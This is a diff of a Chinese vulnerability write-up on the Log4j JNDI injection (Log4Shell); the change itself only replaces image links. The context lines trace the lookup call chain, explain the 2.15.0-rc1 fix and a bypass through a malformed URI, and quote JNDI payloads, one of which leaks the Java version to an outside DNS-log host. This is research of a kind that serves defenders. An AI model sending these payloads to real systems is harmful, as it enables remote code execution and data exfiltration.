@@ -64,21 +64,21 @@ main:42, log4j
 
 这里的event参数即为封装的日志事件，其中message参数包含我们的exploit。然后会调用this.formatters中的format方法
 
-![image-20211211143838953](./images/image-20211211143838953.png)
+![image-20211211143838953](https://gitee.com/w4nder/imgs/raw/master/image-20211211143838953.png)
 
 format方法中会调用this.converter的format方法
 
-![image-20211211151305638](./images/image-20211211151305638.png)
+![image-20211211151305638](https://gitee.com/w4nder/imgs/raw/master/image-20211211151305638.png)
 
 formatters如下，主要是每个formatter的converter属性不同，这里主要看MessagePatternConverter，因为是处理message即恶意参数的
 
-![image-20211211150649037](./images/image-20211211150649037.png)
+![image-20211211150649037](https://gitee.com/w4nder/imgs/raw/master/image-20211211150649037.png)
 
 MessagePatternConverter#format
 
 这里从event取出message后会拼接上workingBuilder，然后判断其中是否有连续的`${`字符，如果有则取出进行替换(其实就是解析${}中的内容)
 
-![image-20211211152137585](./images/image-20211211152137585.png)
+![image-20211211152137585](https://gitee.com/w4nder/imgs/raw/master/image-20211211152137585.png)
 
 经过几个调用
 
@@ -103,17 +103,17 @@ replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
 
 这里会调用resolver#lookup，并且支持的lookup调用在strLookupMap中，这里可以看到jndi
 
-![image-20211211153508179](./images/image-20211211153508179.png)
+![image-20211211153508179](https://gitee.com/w4nder/imgs/raw/master/image-20211211153508179.png)
 
 先继续跟入Interpolator#lookup
 
 这里会根据var的前四位来从strLookupMap中取对应的lookup实现，这里因为是`jndi:ldap://localhost:1234/Exploit`所以取出JndiLookup，然后在下面调用JndiLookup#lookup方法
 
-![image-20211211153540919](./images/image-20211211153540919.png)
+![image-20211211153540919](https://gitee.com/w4nder/imgs/raw/master/image-20211211153540919.png)
 
 最终在JndiManager#lookup中完成jndi注入
 
-![image-20211211153932982](./images/image-20211211153932982.png)
+![image-20211211153932982](https://gitee.com/w4nder/imgs/raw/master/image-20211211153932982.png)
 
 ## 2.15.0-rc1
 
@@ -121,17 +121,17 @@ replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
 
 可以看到MessagePatternConverter变成了MessagePatternConverter$SimpleMessagePatternConverter
 
-![image-20211211154508254](./images/image-20211211154508254.png)
+![image-20211211154508254](https://gitee.com/w4nder/imgs/raw/master/image-20211211154508254.png)
 
 看一下他的format方法，这里并没有对${}进行提取解析，只是将它拼接到error的日志格式后了
 
-![image-20211211154625352](./images/image-20211211154625352.png)
+![image-20211211154625352](https://gitee.com/w4nder/imgs/raw/master/image-20211211154625352.png)
 
 而真正解析的地方被放到了
 
 MessagePatternConverter$LookupMessagePatternConverter中，但是之前formatters中根本就没有这个Converter，所以其实算是修复了
 
-![image-20211211154815673](./images/image-20211211154815673.png)
+![image-20211211154815673](https://gitee.com/w4nder/imgs/raw/master/image-20211211154815673.png)
 
 除非手动构造一个，但是感觉这样有点鸡肋...不知道还有没有其他方法，这里用了4train师傅的构造
 
@@ -153,21 +153,21 @@ public static void main(String[] args) {
 
 不过这里rc1中JndiManager#lookup中有规定运行的地址、类、以及协议，可以看到这里只允许ldap请求本地服务，基本上寄了
 
-![image-20211211155829341](./images/image-20211211155829341.png)
+![image-20211211155829341](https://gitee.com/w4nder/imgs/raw/master/image-20211211155829341.png)
 
 但是官方后来又发布了2.15.0-rc2
 
 其中一个补丁是在JndiManager#lookup中增加了捕获到异常后的返回处理
 
-![image-20211211160025091](./images/image-20211211160025091.png)
+![image-20211211160025091](https://gitee.com/w4nder/imgs/raw/master/image-20211211160025091.png)
 
 还有一处是官方测试时添加的，那么可以猜测使用一些特殊字符放入jndi的uri中另程序进入异常，并且rc1中不会进行异常处理，以此绕过
 
-![image-20211211160228781](./images/image-20211211160228781.png)
+![image-20211211160228781](https://gitee.com/w4nder/imgs/raw/master/image-20211211160228781.png)
 
 所以加个在ClassName前加个空格就好了，本地利用需要tomcat的包(支持BeanFactory、ELProcessor)或者其他gadget
 
-![image-20211211160626836](./images/image-20211211160626836.png)
+![image-20211211160626836](https://gitee.com/w4nder/imgs/raw/master/image-20211211160626836.png)
 
 ## 其他
 
@@ -175,21 +175,21 @@ public static void main(String[] args) {
 
 `${jndi:ldap://${sys:java.version}.7i3934.dnslog.cn:1099/}`
 
-![image-20211212215217436](log4j_RCE.assets/image-20211212215217436.png)
+![image-20211212215217436](https://gitee.com/w4nder/imgs/raw/master/image-20211212215217436.png)
 
 还是这几个lookup实现
 
-![image-20211212215658902](log4j_RCE.assets/image-20211212215658902.png)
+![image-20211212215658902](https://gitee.com/w4nder/imgs/raw/master/image-20211212215658902.png)
 
 比如sys
 
 SystemPropertiesLookup#lookup，就能从System.getProperties()中取值
 
-![image-20211212215815630](log4j_RCE.assets/image-20211212215815630.png)
+![image-20211212215815630](https://gitee.com/w4nder/imgs/raw/master/image-20211212215815630.png)
 
 EnvironmentLookup#lookup是从System.getenv()取值
 
-![image-20211212220007210](log4j_RCE.assets/image-20211212220007210.png)
+![image-20211212220007210](https://gitee.com/w4nder/imgs/raw/master/image-20211212220007210.png)
 
 JavaLookup#lookup局限这几个
 
@@ -197,7 +197,7 @@ JavaLookup#lookup局限这几个
 
 浅蓝师傅还发现了如果使用了ResourceBundleLookup#lookup，可以读取properties配置文件
 
-![image-20211212222047702](log4j_RCE.assets/image-20211212222047702.png)
+![image-20211212222047702](https://gitee.com/w4nder/imgs/raw/master/image-20211212222047702.png)
 
 但是strLookupMap中没有bundle这个key，应该不能直接触发，除非开发人员直接使用并且参数可控
 
